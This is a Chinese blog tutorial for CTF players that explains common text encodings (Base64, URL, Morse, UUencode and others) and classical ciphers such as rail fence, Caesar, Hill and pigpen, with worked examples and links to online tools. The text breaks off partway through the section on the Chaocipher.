    <content type="html"><![CDATA[<h2 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h2><p>正文开始之前先闲扯几句吧，玩CTF的小伙伴也许会遇到类似这样的问题:表哥，你知道这是什么加密吗？其实CTF中脑洞密码题(非现代加密方式)一般都是各种古典密码的变形，一般出题者会对密文进行一些处理，但是会给留一些线索，所以写此文的目的是想给小伙伴做题时给一些参考，当然常在CTF里出现的编码也可以了解一下。本来是想尽快写出参考的文章，无奈期间被各种事情耽搁导致文章断断续续写了2个月，文章肯定有许多没有提及到，欢迎小伙伴补充，总之，希望对小伙伴们有帮助吧！</p><h2 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h2><pre><code>常见编码:    1.ASCII编码    2.Base64/32/16编码    3.shellcode编码    4.Quoted-printable编码    5.XXencode编码    6.UUencode编码    7.URL编码    8.Unicode编码    9.Escape/Unescape编码    10.HTML实体编码    11.敲击码(Tap code)    12.莫尔斯电码(Morse Code)    13.编码的故事各种文本加密换位加密:    1.栅栏密码(Rail-fence Cipher)    2.曲路密码(Curve Cipher)    3.列移位密码(Columnar Transposition Cipher)替换加密:    1.埃特巴什码(Atbash Cipher)    2.凯撒密码(Caesar Cipher)    3.ROT5/13/18/47    4.简单换位密码(Simple Substitution Cipher)    5.希尔密码(Hill Cipher)    6.猪圈密码(Pigpen Cipher)    7.波利比奥斯方阵密码（Polybius Square Cipher)    8.夏多密码(曲折加密)    9.普莱菲尔密码(Playfair Cipher)    10.维吉尼亚密码(Vigenère Cipher)    11.自动密钥密码(Autokey Cipher)    12.博福特密码(Beaufort Cipher)    13.滚动密钥密码(Running Key Cipher)    14.Porta密码(Porta Cipher)    15.同音替换密码(Homophonic Substitution Cipher)    16.仿射密码(Affine Cipher)    17.培根密码(Baconian Cipher)    18.ADFGX和ADFGVX密码(ADFG/VX Cipher)    19.双密码(Bifid Cipher)    20.三分密码(Trifid Cipher)    21.四方密码(Four-Square Cipher)    22.棋盘密码（Checkerboard Cipher)    23.跨棋盘密码(Straddle Checkerboard Cipher)    24.分组摩尔斯替换密码(Fractionated Morse Cipher)    25.Bazeries密码(Bazeries Cipher)    26.Digrafid密码(Digrafid Cipher)    27.格朗普雷密码(Grandpré Cipher)    28.比尔密码(Beale ciphers)    29.键盘密码(Keyboard Cipher)其他有趣的机械密码:    1.恩尼格玛密码代码混淆加密:    1.asp混淆加密    2.php混淆加密    3.css/js混淆加密    4.VBScript.Encode混淆加密    5.ppencode    6.rrencode    7.jjencode/aaencode    8.JSfuck    9.jother    10.brainfuck编程语言相关工具参考网站</code></pre><a id="more"></a><h2 id="0x02-正文"><a href="#0x02-正文" class="headerlink" title="0x02 正文"></a>0x02 正文</h2><h3 id="常见编码"><a href="#常见编码" class="headerlink" title="常见编码"></a>常见编码</h3><h4 id="1-ASCII编码"><a href="#1-ASCII编码" class="headerlink" title="1.ASCII编码"></a>1.ASCII编码</h4><p>ASCII编码大致可以分作三部分组成：</p><p>第一部分是：ASCII非打印控制字符（参详ASCII码表中0-31）;</p><p>第二部分是：ASCII打印字符，也就是CTF中常用到的转换;</p><p><img src="http://img2.tuicool.com/ZBBVN3f.jpg" alt="800px-Vigenère_square_shading.svg.png"></p><p>第三部分是：扩展ASCII打印字符(第一第三部分详见<a href="http://www.asciima.com/" target="_blank" rel="external">ASCII码表</a>解释)。</p><p>编码转换示例</p><p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p><p><img src="http://img0.tuicool.com/3UVj6rn.png" alt="小葵"></p><p>ASCII编码对应十进制：</p><pre><code>84 104 101 32 113 117 105 99 107 32 98 114 111 119 110 32 102 111 120 32 106 117 109 112 115 32 111 118 101 114 32 116 104 101 32 108 97 122 121 32 100 111 103</code></pre><p>对应可以转换成二进制，八进制，十六进制等。</p><hr><h4 id="2-Base64-32-16编码"><a href="#2-Base64-32-16编码" class="headerlink" title="2.Base64/32/16编码"></a>2.Base64/32/16编码</h4><p>base64、base32、base16可以分别编码转化8位字节为6位、5位、4位。16,32,64分别表示用多少个字符来编码，这里我注重介绍base64。Base64常用于在通常处理文本数据的场合，表示、传输、存储一些二进制数据。包括MIME的email，email via MIME,在XML中存储复杂数据。</p><p>编码原理：Base64编码要求把3个8位字节转化为4个6位的字节，之后在6位的前面补两个0，形成8位一个字节的形式，6位2进制能表示的最大数是2的6次方是64，这也是为什么是64个字符(A-Z,a-z，0-9，+，/这64个编码字符，=号不属于编码字符，而是填充字符)的原因，这样就需要一张映射表，如下：<br><img src="http://img2.tuicool.com/jiIR3yZ.png" alt="base64字母表.png"></p><p>举个例子(base64)：</p><blockquote><p>源文本：T h e</p><p>对应ascii码:84 104 101</p><p>8位binary：01010100 01101000 01100101</p><p>6位binary：010101 000110 100001 100101</p><p>高位补0：000010101 00000110 00100001 00100101</p><p>对应ascii码：21 6 33 37</p><p>查表：V G h l</p></blockquote><p>利用Python base64模块，我们分别可以这样加密解密base64 32 16：</p><p><img src="http://img0.tuicool.com/Q7RZvqM.png" alt="python加解base64.png"></p><hr><h4 id="3-shellcode编码"><a href="#3-shellcode编码" class="headerlink" title="3.shellcode编码"></a>3.shellcode编码</h4><p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p><p>编码后：</p><pre><code>\x54\x68\x65\x7f\x71\x75\x69\x63\x6b\x7f\x62\x72\x6f\x77\x6e\x7f\x66\x6f\x78\x7f\x6a\x75\x6d\x70\x73\x7f\x6f\x76\x65\x72\x7f\x74\x68\x65\x7f\x6c\x61\x7a\x79\x7f\x64\x6f\x67</code></pre><p><img src="http://img2.tuicool.com/VNBrEvE.png" alt="shellcode.png"></p><hr><h4 id="4-Quoted-printable-编码"><a href="#4-Quoted-printable-编码" class="headerlink" title="4.Quoted-printable 编码"></a>4.Quoted-printable 编码</h4><p>它是多用途互联网邮件扩展（MIME) 一种实现方式。有时候我们可以邮件头里面能够看到这样的编码，编码原理<a href="http://blog.chacuo.net/494.html" target="_blank" rel="external">参考</a>。<br><img src="http://img1.tuicool.com/fmU7fij.png" alt="Quoted-printable 编码.png"><br>源文本：<code>敏捷的棕色狐狸跳过了懒惰的狗</code></p><p>编码后：</p><pre><code>=E6=95=8F=E6=8D=B7=E7=9A=84=E6=A3=95=E8=89=B2=E7=8B=90=E7=8B=B8=E8=B7=B3=E8=BF=87=E4=BA=86=E6=87=92=E6=83=B0=E7=9A=84=E7=8B=97</code></pre><p>编码解码<a href="http://www.mxcz.net/tools/QuotedPrintable.aspx" target="_blank" rel="external">链接</a></p><hr><h4 id="5-XXencode编码"><a href="#5-XXencode编码" class="headerlink" title="5.XXencode编码"></a>5.XXencode编码</h4><p>XXencode将输入文本以每三个字节为单位进行编码。如果最后剩下的资料少于三个字节，不够的部份用零补齐。这三个字节共有24个Bit，以6bit为单位分为4个组，每个组以十进制来表示所出现的数值只会落在0到63之间。以所对应值的位置字符代替。它所选择的可打印字符是：+-0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz，一共64个字符。跟base64打印字符相比，就是UUencode多一个“-” 字符，少一个”/” 字符。<br><img src="http://img2.tuicool.com/m6VjIb3.png" alt="XXencode.png"></p><p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p><p>编码后：<code>hJ4VZ653pOKBf647mPrRi64NjS0-eRKpkQm-jRaJm65FcNG-gMLdt64FjNkc+</code></p><p>编码解码<a href="http://web.chacuo.net/charsetxxencode" target="_blank" rel="external">链接</a></p><hr><h4 id="6-UUencode编码"><a href="#6-UUencode编码" class="headerlink" title="6.UUencode编码"></a>6.UUencode编码</h4><p>UUencode是一种二进制到文字的编码，最早在unix 邮件系统中使用，全称：Unix-to-Unix encoding，UUencode将输入文本以每三个字节为单位进行编码，如果最后剩下的资料少于三个字节，不够的部份用零补齐。三个字节共有24个Bit，以6-bit为单位分为4个组，每个组以十进制来表示所出现的字节的数值。这个数值只会落在0到63之间。然后将每个数加上32，所产生的结果刚好落在ASCII字符集中可打印字符（32-空白…95-底线）的范围之中。</p><p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p><p>编码后：<code>M5&amp;AE(&#39;%U:6-K(&amp;)R;W=N(&amp;9O&gt;&quot;!J=6UP&lt;R!O=F5R(&#39;1H92!L87IY(&amp;1O9PH*</code></p><p>编码解码<a href="http://web.chacuo.net/charsetuuencode" target="_blank" rel="external">链接</a></p><hr><h4 id="7-URL编码"><a href="#7-URL编码" class="headerlink" title="7.URL编码"></a>7.URL编码</h4><p>url编码又叫百分号编码，是统一资源定位(URL)编码方式。URL地址（常说网址）规定了常用地数字，字母可以直接使用，另外一批作为特殊用户字符也可以直接用（/,:@等），剩下的其它所有字符必须通过%xx编码处理。 现在已经成为一种规范了，基本所有程序语言都有这种编码，如js：有encodeURI、encodeURIComponent，PHP有 urlencode、urldecode等。编码方法很简单，在该字节ascii码的的16进制字符前面加%. 如 空格字符，ascii码是32，对应16进制是’20’，那么urlencode编码结果是:%20。</p><p>源文本：<code>The quick brown fox jumps over the lazy dog</code></p><p>编码后：</p><pre><code>%54%68%65%20%71%75%69%63%6b%20%62%72%6f%77%6e%20%66%6f%78%20%6a%75%6d%70%73%20%6f%76%65%72%20%74%68%65%20%6c%61%7a%79%20%64%6f%67</code></pre><p>编码解码<a href="http://web.chacuo.net/charseturlencode" target="_blank" rel="external">链接</a></p><hr><h4 id="8-Unicode编码"><a href="#8-Unicode编码" class="headerlink" title="8.Unicode编码"></a>8.Unicode编码</h4><p>Unicode编码有以下四种编码方式：</p><p>源文本：<code>The</code></p><p>&amp;#x [Hex]：<code>&amp;#x0054;&amp;#x0068;&amp;#x0065;</code></p><p>&amp;# [Decimal]：<code>&amp;#00084;&amp;#00104;&amp;#00101;</code></p><p>\U [Hex]：<code>\U0054\U0068\U0065</code></p><p>\U+ [Hex]：<code>\U+0054\U+0068\U+0065</code></p><p>编码解码<a href="http://www.mxcz.net/tools/Unicode.aspx" target="_blank" rel="external">链接</a></p><hr><h4 id="9-Escape-Unescape编码"><a href="#9-Escape-Unescape编码" class="headerlink" title="9.Escape/Unescape编码"></a>9.Escape/Unescape编码</h4><p>Escape/Unescape加密解码/编码解码,又叫%u编码，采用UTF-16BE模式， Escape编码/加密,就是字符对应UTF-16 16进制表示方式前面加%u。Unescape解码/解密，就是去掉”%u”后，将16进制字符还原后，由utf-16转码到自己目标字符。如：字符“中”，UTF-16BE是：“6d93”，因此Escape是“%u6d93”。</p><p>源文本：<code>The</code></p><p>编码后：<code>%u0054%u0068%u0065</code></p><hr><h4 id="10-HTML实体编码"><a href="#10-HTML实体编码" class="headerlink" title="10.HTML实体编码"></a>10.HTML实体编码</h4><p><img src="http://img1.tuicool.com/feemAzq.png" alt="html实体编码.png"></p><p>完整编码手册<a href="http://www.w3school.com.cn/tags/html_ref_entities.html" target="_blank" rel="external">参考</a></p><hr><h4 id="11-敲击码"><a href="#11-敲击码" class="headerlink" title="11.敲击码"></a>11.敲击码</h4><p>敲击码(Tap code)是一种以非常简单的方式对文本信息进行编码的方法。因该编码对信息通过使用一系列的点击声音来编码而命名，敲击码是基于5×5方格波利比奥斯方阵来实现的，不同点是是用K字母被整合到C中。</p><p>敲击码表:</p><pre><code>  1  2  3  4  51 A  B C/K D  E2 F  G  H  I  J 3 L  M  N  O  P4 Q  R  S  T  U5 V  W  X  Y  Z</code></pre><p><img src="http://img1.tuicool.com/raAVR3U.jpg" alt="敲击码.jpg"></p><hr><h4 id="12-莫尔斯电码"><a href="#12-莫尔斯电码" class="headerlink" title="12.莫尔斯电码"></a>12.莫尔斯电码</h4><p>摩尔斯电码(Morse Code)是由美国人萨缪尔·摩尔斯在1836年发明的一种时通时断的且通过不同的排列顺序来表达不同英文字母、数字和标点符号的信号代码，摩尔斯电码主要由以下5种它的代码组成：</p><ol><li>点（.）</li><li>划（-）</li><li>每个字符间短的停顿（通常用空格表示停顿）</li><li>每个词之间中等的停顿（通常用<code>/</code>划分）</li><li>以及句子之间长的停顿</li></ol><p>摩尔斯电码字母和数字对应表：</p><pre><code>A  .-    N  -.    .  .-.-.-  +  .-.-.     1  .----B  -...  O  ---   ,  --..--  _  ..--.-     2  ..---C  -.-.  P  .--.  :  ---...  $  ...-..-     3  ...--D  -..   Q  --.-  &quot;  .-..-.  &amp;  .-...     4  ....-E  .     R  .-.   &apos;  .----.  /  -..-.     5  .....F  ..-.  S  ...   !  -.-.--               6  -....G  --.   T  -     ?  ..--..               7  --...H  ....  U  ..-   @  .--.-.               8  ---..I  ..    V  ...-  -  -....-               9  ----.J  .---  W  .--   ;  -.-.-.               0  -----K  -.-   X  -..-  (  -.--.           L  .-..  Y  -.--  )  -.--.-          M  --    Z  --..  =  -...-                          </code></pre><p>源文本:<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>编码后:</p><pre><code>- .... . / --.- ..- .. -.-. -.- / -... .-. --- .-- -. / ..-. --- -..- / .--- ..- -- .--. ... / --- ...- . .-. / - .... . / .-.. .- --.. -.-- / -.. --- --.</code></pre><p>在线编码解码<a href="http://rumkin.com/tools/cipher/morse.php" target="_blank" rel="external">传送门</a></p><p>摩尔斯电码除了能对字母数字编码以外还对一些标点符号，非英语字符进行了编码，而且还有一些特定意义的组合称为特殊符号，比如<code>·-·-·-·-·-</code>表达的意思是调用信号，表示“我有消息发送”。如果你感兴趣可以参考<a href="https://zh.wikipedia.org/wiki/%E6%91%A9%E5%B0%94%E6%96%AF%E7%94%B5%E7%A0%81" target="_blank" rel="external">WiKi</a>。</p><hr><h4 id="13-编码的故事"><a href="#13-编码的故事" class="headerlink" title="13.编码的故事"></a>13.编码的故事</h4><p>推荐大家去看<a href="http://wenku.baidu.com/link?url=kTrscV5j5AsZq5zvBpr2jdkEJW8LqgrkkKsddwWA3YlXmgeqh_be95nMxqbFPOYoVBVy3A6lutlcXVDYLdZ-3iRawJpc0VZ71as07FnxtGS" target="_blank" rel="external">编码的故事</a>一文。</p><hr><h3 id="各种文本加密"><a href="#各种文本加密" class="headerlink" title="各种文本加密"></a>各种文本加密</h3><p>文本加密可以将正常文本内容打乱为不可连读的文字或符号(汉字 数字 字母 音乐符号 国际音标 盲文 韩文 日文 傣文 彝文 箭头符号 花朵符号 俄文)，换行等格式信息也会被清除，达到加密的作用。在进行文本加密时可以设定一个密码，这样只有知道密码的人才能解密文本。密码可以是数字、字母和下划线，最多九位。</p><p>加密示例：</p><p>源文本：<code>敏捷的棕色狐狸跳过了懒惰的狗</code></p><p><img src="http://img2.tuicool.com/zqiEbay.png" alt="文本加密.png"></p><p>编码解码<a href="http://www.qqxiuzi.cn/bianma/wenbenjiami.php" target="_blank" rel="external">链接</a></p><hr><h3 id="换位加密"><a href="#换位加密" class="headerlink" title="换位加密"></a>换位加密</h3><h4 id="1-栅栏密码"><a href="#1-栅栏密码" class="headerlink" title="1.栅栏密码"></a>1.栅栏密码</h4><p><strong>（1）介绍</strong></p><p>栅栏密码(Rail-fence Cipher)就是把要加密的明文分成N个一组，然后把每组的第1个字符组合，每组第2个字符组合…每组的第N(最后一个分组可能不足N个)个字符组合，最后把他们全部连接起来就是密文，这里以2栏栅栏加密为例。</p><p>明文：<code>The quick brown fox jumps over the lazy dog</code></p><p>去空格：<code>Thequickbrownfoxjumpsoverthelazydog</code></p><p>分组：<code>Th eq ui ck br ow nf ox ju mp so ve rt he la zy do g</code></p><p>第一组：<code>Teucbonojmsvrhlzdg</code></p><p>第二组：<code>hqikrwfxupoeteayo</code></p><p>密文：<code>Teucbonojmsvrhlzdghqikrwfxupoeteayo</code></p><p>加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/rail-fence/" target="_blank" rel="external">传送门</a></p><hr><h4 id="2-曲路密码"><a href="#2-曲路密码" class="headerlink" title="2.曲路密码"></a>2.曲路密码</h4><p>曲路密码(Curve Cipher)是一种换位密码，需要事先双方约定密钥(也就是曲路路径)。</p><p>明文：<code>The quick brown fox jumps over the lazy dog</code></p><p>填入5行7列表(事先约定填充的行列数)</p><p><img src="http://img2.tuicool.com/aURZRvE.png" alt="曲路密码表.png"></p><p>加密的回路线(事先约定填充的行列数)</p><p><img src="http://img1.tuicool.com/rmiIv2Z.png" alt="曲路密码路径.png"></p><p>密文：<code>gesfc inpho dtmwu qoury zejre hbxva lookT</code></p><hr><h4 id="3-列移位密码"><a href="#3-列移位密码" class="headerlink" title="3.列移位密码"></a>3.列移位密码</h4><p><strong>（1）介绍</strong></p><p>列移位密码(Columnar Transposition Cipher)是一种比较简单，易于实现的换位密码，通过一个简单的规则将明文打乱混合成密文。下面我们以明文 The quick brown fox jumps over the lazy dog，密钥 how are u为例：</p><p>填入5行7列表(事先约定填充的行列数，如果明文不能填充完表格可以约定使用某个字母进行填充)</p><p><img src="http://img2.tuicool.com/aURZRvE.png" alt="列移位密码.png"></p><p>密钥：<code>how are u</code></p><p>按how are u在字母表中的出现的先后顺序进行编号，我们就有a为1,e为2，h为3，o为4，r为5，u为6，w为7，所以先写出a列，其次e列，以此类推写出的结果便是密文：</p><p><img src="http://img0.tuicool.com/AfiMnq3.png" alt="列移位密码示例.png"></p><p>密文：<code>qoury inpho Tkool hbxva uwmtd cfseg erjez</code></p><p>这里提供一个行列数相等的填充规则列移位密码加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/columnar-transposition/" target="_blank" rel="external">链接</a></p><p>另外由列移位密码变化来的密码也有其他的，比如<a href="http://www.thonky.com/kryptos/amsco-cipher" target="_blank" rel="external">Amsco密码</a>(Amsco Cipher)和<a href="http://www.thonky.com/kryptos/cadenus-cipher" target="_blank" rel="external">Cadenus密码</a>(Cadenus Cipher)。</p><h3 id="替换加密"><a href="#替换加密" class="headerlink" title="替换加密"></a>替换加密</h3><hr><h4 id="1-埃特巴什码"><a href="#1-埃特巴什码" class="headerlink" title="1.埃特巴什码"></a>1.埃特巴什码</h4><p><strong>（1）介绍</strong></p><p>埃特巴什码(Atbash Cipher)是一种以字母倒序排列作为特殊密钥的替换加密，也就是下面的对应关系：</p><pre><code>ABCDEFGHIJKLMNOPQRSTUVWXYZZYXWVUTSRQPONMLKJIHGFEDCBA</code></pre><p>明文：<code>the quick brown fox jumps over the lazy dog</code></p><p>密文：<code>gsv jfrxp yildm ulc qfnkh levi gsv ozab wlt</code></p><p>加解密<a href="http://www.practicalcryptography.com/ciphers/classical-era/atbash-cipher/" target="_blank" rel="external">传送门</a></p><hr><h4 id="2-凯撒密码"><a href="#2-凯撒密码" class="headerlink" title="2.凯撒密码"></a>2.凯撒密码</h4><p><strong>（1）介绍</strong></p><p>凯撒密码(Caesar Cipher或称恺撒加密、恺撒变换、变换加密、位移加密)是一种替换加密，明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。例，当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推，更多<a href="https://en.wikipedia.org/wiki/Caesar_cipher" target="_blank" rel="external">参考</a>。</p><p>加密实例：</p><p>明文：<code>The quick brown fox jumps over the lazy dog</code></p><p>偏移量：1</p><p>密文：<code>Uif rvjdl cspxo gpy kvnqt pwfs uif mbaz eph</code></p><p><img src="http://img2.tuicool.com/2UzQjyu.png" alt="凯撒密码.png"></p><p>你也可以使用Python的pycipher模块来加解密，如果提示没有这个模块可以通过<code>pip install pycipher</code>或者其他方式来安装pycipher模块。</p><pre><code>&gt;&gt;&gt; from pycipher import Caesar&gt;&gt;&gt; Caesar(key=1).encipher(&apos;The quick brown fox jumps over the lazy dog&apos;)&apos;UIFRVJDLCSPXOGPYKVNQTPWFSUIFMBAZEPH&apos;&gt;&gt;&gt; Caesar(key=1).decipher(&apos;UIFRVJDLCSPXOGPYKVNQTPWFSUIFMBAZEPH&apos;)&apos;THEQUICKBROWNFOXJUMPSOVERTHELAZYDOG&apos;</code></pre><p>参考表(这里是向后移位加密，向前移位解密)：</p><p><img src="http://img2.tuicool.com/yAfyYnM.jpg" alt="凯撒密码移位规律表.jpg"></p><p>加密解密<a href="http://planetcalc.com/1434/" target="_blank" rel="external">链接</a>(这个网站可以将26种情况一次性列举出来，比较方便)</p><hr><h4 id="3-ROT5-13-18-47"><a href="#3-ROT5-13-18-47" class="headerlink" title="3.ROT5/13/18/47"></a>3.ROT5/13/18/47</h4><p><strong>（1）介绍</strong></p><p>ROT5/13/18/47是一种简单的码元位置顺序替换暗码。此类编码具有可逆性，可以自我解密，主要用于应对快速浏览，或者是机器的读取。</p><blockquote><p>ROT5 是 rotate by 5 places 的简写，意思是旋转5个位置，其它皆同。下面分别说说它们的编码方式：</p><p>ROT5：只对数字进行编码，用当前数字往前数的第5个数字替换当前数字，例如当前为0，编码后变成5，当前为1，编码后变成6，以此类推顺序循环。</p><p>ROT13：只对字母进行编码，用当前字母往前数的第13个字母替换当前字母，例如当前为A，编码后变成N，当前为B，编码后变成O，以此类推顺序循环。</p><p>ROT18：这是一个异类，本来没有，它是将ROT5和ROT13组合在一起，为了好称呼，将其命名为ROT18。</p><p>ROT47：对数字、字母、常用符号进行编码，按照它们的ASCII值进行位置替换，用当前字符ASCII值往前数的第47位对应字符替换当前字符，例如当前为小写字母z，编码后变成大写字母K，当前为数字0，编码后变成符号_。用于ROT47编码的字符其ASCII值范围是33－126，具体可参考ASCII编码，下面以rot13以例。</p></blockquote><p>明文：<code>the quick brown fox jumps over the lazy dog</code></p><p>密文：<code>gur dhvpx oebja sbk whzcf bire gur ynml qbt</code></p><p><a href="http://www.qqxiuzi.cn/bianma/ROT5-13-18-47.php" target="_blank" rel="external">传送门</a></p><hr><h4 id="4-简单替换密码"><a href="#4-简单替换密码" class="headerlink" title="4.简单替换密码"></a>4.简单替换密码</h4><p><strong>（1）介绍</strong></p><p>简单换位密码(Simple Substitution Cipher)加密方式是以每个明文字母被与之唯一对应且不同的字母替换的方式实现的，它不同于恺撒密码，因为密码字母表的字母不是简单的移位，而是完全是混乱的。 比如：</p><pre><code>明文字母 : abcdefghijklmnopqrstuvwxyz明文字母 : phqgiumeaylnofdxjkrcvstzwb</code></pre><p>明文：<code>the quick brown fox jumps over the lazy dog</code></p><p>密文：<code>cei jvaql hkdtf udz yvoxr dsik cei npbw gdm</code></p><p><strong>（2）破解</strong></p><p>当密文数据足够多时这种密码我们可以通过字频分析方法破解或其他方法破解，比较好的在线词频分析网站<a href="http://quipqiup.com/index.php" target="_blank" rel="external">http://quipqiup.com/index.php</a>(翻= =墙)，这里推荐一篇通过”爬山算法”来破解简单替换密码<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-simple-substitution-cipher/" target="_blank" rel="external">文章</a>，基于文中的算法实现的工具来破解示例。</p><p>密文：</p><pre><code>pmpafxaikkitprdsikcplifhwceigixkirradfeirdgkipgigudkcekiigpwrpucikceiginasikwduearrxiiqepcceindgmieinpwdfprduppcedoikiqiasafmfddfipfgmdafmfdteiki</code></pre><p>解密：</p><p><img src="http://img2.tuicool.com/2If63mn.png" alt="破解简单替换密码.png"><br>(ps:score值越小越准确)</p><p>密钥：<code>PHQGIUMEAVLNOFDXBKRCZSTJWY</code></p><p>明文：</p><pre><code>AGAINPIERREWASOVERTAKENBYTHEDEPRESSIONHESODREADEDFORTHREEDAYSAFTERTHEDELIVERYOFHISSPEECHATTHELODGEHELAYONASOFAATHOMERECEIVINGNOONEANDGOINGNOWHERE</code></pre><p>将明文转换成可读句子：</p><p>again pierre was over taken by the depression he so dreaded for three day safter the delivery of his speech at the lodge he lay on a sofa at home receiving no one and going no where</p><hr><h4 id="5-希尔密码"><a href="#5-希尔密码" class="headerlink" title="5.希尔密码"></a>5.希尔密码</h4><p><strong>（1）介绍</strong></p><p>希尔密码(Hill Cipher)是基于线性代数多重代换密码，由Lester S. Hill在1929年发明。每个字母转换成26进制数字：A=0, B=1, C=2…Z=25一串字母当成n维向量，跟一个n×n的矩阵相乘，再将得出的结果MOD26。更多<a href="https://en.wikipedia.org/wiki/Hill_cipher" target="_blank" rel="external">参考</a></p><p><strong>（2）加密</strong></p><p>明文：<code>ACT</code></p><p><img src="http://img1.tuicool.com/aIZ3eiN.png" alt="字母数字对应表.png"></p><p>明文对应矩阵：</p><p><img src="http://img2.tuicool.com/uUNV3yz.png" alt="明文对应矩阵.png"></p><p>加密密钥：<code>GYBNQKURP</code></p><p>加密矩阵：</p><p><img src="http://img0.tuicool.com/uaaEZjm.png" alt="加密矩阵.png"></p><p>计算过程：</p><p><img src="http://img1.tuicool.com/jMzIfm6.png" alt="计算过程.png"></p><p>密文：<code>FIN</code></p><p><strong>（3）解密</strong></p><p>密文：<code>FIN</code></p><p>计算加密矩阵的逆矩阵：</p><p><img src="http://img2.tuicool.com/Vn2QV3B.png" alt="计算加密矩阵的逆矩阵.png"></p><p>解密计算：</p><p><img src="http://img0.tuicool.com/FBVRRn3.png" alt="解密计算.png"></p><p>明文：<code>ACT</code></p><p>至于证明和求逆可以参考线性代数知识。</p><p><strong>（4）破解</strong></p><p>密码分析一门破解编码和密码的艺术。当我们尝试去攻破希尔密码你会发现频率分析实际上没有什么用处，特别在密钥长度增多的情况下。对于较长的二元矩阵（2×2的希尔密码）频率分析可能可能会有帮助，但是对于较短的密文分析是没有实际作用的。</p><p>这里推荐一篇关于用<a href="http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-hill-cipher/" target="_blank" rel="external">已知明文样本攻击的方式破解希尔密码</a>的文章，基础的希尔密码用<a href="https://en.wikipedia.org/wiki/Known-plaintext_attack" target="_blank" rel="external">已知明文攻击</a>的方式是可攻破的，由于加密完全是线性的，所以攻击者在截取到部分明文/密文字符对可以轻松建立一个线性系统，轻松搞定希尔密码，如果不能完全确定线性系统，那么只需要添加部分明文/密文对即可。已知明文攻击时最好的方式去破解写入密码，如果明文一无所知，那就进行推测猜出部分明文。基于已知明文样本攻击的方式破解希尔密码的算法的实现工具破解示例：</p><p>密文：</p><pre><code>XUKEXWSLZJUAXUNKIGWFSOZRAWURORKXAOSLHROBXBTKCMUWDVPTFBLMKEFVWMUXTVTWUIDDJVZKBRMCWOIWYDXMLUFPVSHAGSVWUFWORCWUIDUJCNVTTBERTUNOJUZHVTWKORSVRZSVVFSQXOCMUWPYTRLGBMCYPOJCLRIYTVFCCMUWUFPOXCNMCIWMSKPXEDLYIQKDJWIWCJUMVRCJUMVRKXWURKPSEEIWZVXULEIOETOOFWKBIUXPXUGOWLFPWUSCH</code></pre><p>解密：</p><p>解密<a href="http://bobao.360.cn/ctf/learning/136.html" target="_blank" rel="external">脚本实例</a></p><p>在线加解密<a href="http://www.practicalcryptography.com/ciphers/hill-cipher/" target="_blank" rel="external">传送门</a></p><hr><h4 id="6-猪圈密码"><a href="#6-猪圈密码" class="headerlink" title="6.猪圈密码"></a>6.猪圈密码</h4><p><strong>（1）介绍</strong></p><p>猪圈密码(Pigpen Cipher或称九宫格密码、朱高密码、共济会密码或共济会员密码)，是一种以格子为基础的简单替代式密码。更多<a href="https://en.wikipedia.org/wiki/Pigpen_cipher" target="_blank" rel="external">参考</a></p><p>明文字母和对应密文：</p><p><img src="http://img1.tuicool.com/7Bbyyqu.jpg" alt="猪圈密码.jpg"></p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密文：</p><p><img src="http://img1.tuicool.com/6JNfMju.png" alt="猪圈密码密文.png"></p><p>在线加密<a href="http://www.simonsingh.net/The_Black_Chamber/pigpen.html" target="_blank" rel="external">传送门</a></p><p><strong>（2）变种</strong></p><p>圣堂武士密码(Templar Cipher)是共济会的“猪圈密码”的一个变种，一直被共济会圣殿骑士用。</p><p>明文字母和对应密文：</p><p><img src="http://img2.tuicool.com/eeUfQzM.png" alt="猪圈密码变种.png"></p><p><strong>（3）其他变种</strong></p><p>明文字母和对应密文：</p><p><img src="http://img0.tuicool.com/7vYjyyz.jpg" alt="猪圈密码变种1.jpg"></p><p>明文字母和对应密文：</p><p><img src="http://img0.tuicool.com/2aYnaqR.jpg" alt="猪圈密码变种2.jpg"></p><p>明文字母和对应密文：</p><p><img src="http://img2.tuicool.com/Nnqme2b.png" alt="猪圈密码变种3.png"></p><hr><h4 id="7-波利比奥斯方阵密码"><a href="#7-波利比奥斯方阵密码" class="headerlink" title="7.波利比奥斯方阵密码"></a>7.波利比奥斯方阵密码</h4><p><strong>（1）介绍</strong></p><p>波利比奥斯方阵密码（Polybius Square Cipher或称波利比奥斯棋盘）是棋盘密码的一种，是利用波利比奥斯方阵进行加密的密码方式，简单的来说就是把字母排列好，用坐标(行列)的形式表现出来。字母是密文，明文便是字母的坐标。更多<a href="https://en.wikipedia.org/wiki/Polybius_square" target="_blank" rel="external">参考</a></p><p>常见的排布方式：</p><p><img src="http://img2.tuicool.com/mmuMbqM.png" alt="波利比奥斯方阵密码.png"></p><p>加密实例：</p><p>明文：<code>THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG</code></p><p>密文：<code>442315 4145241325 1242345233 213453 2445323543 442315 31115554 143422</code></p><hr><h4 id="8-夏多密码-曲折加密"><a href="#8-夏多密码-曲折加密" class="headerlink" title="8.夏多密码(曲折加密)"></a>8.夏多密码(曲折加密)</h4><p><strong>（1）介绍</strong></p><p>夏多密码是作者麦克斯韦·格兰特在中篇小说《死亡之链》塑造夏多这一英雄人物中所自创的密码，如下图所示：</p><p><img src="http://img1.tuicool.com/MZZ3yq.png" 